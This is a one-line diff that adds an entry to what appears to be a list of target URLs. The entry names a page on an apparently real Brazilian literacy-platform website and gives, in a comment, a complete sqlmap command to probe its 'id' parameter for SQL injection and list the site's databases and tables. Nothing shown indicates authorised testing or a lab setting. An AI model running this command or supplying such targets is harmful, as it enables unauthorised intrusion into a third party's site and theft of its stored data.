@@ -1,0 +1,1 @@
+http://www.plataformadoletramento.org.br/mural.html?id=14 (GET)  # sqlmap.py -u http://www.plataformadoletramento.org.br/mural.html?id=14 --dbs --tables --threads 5 -v3
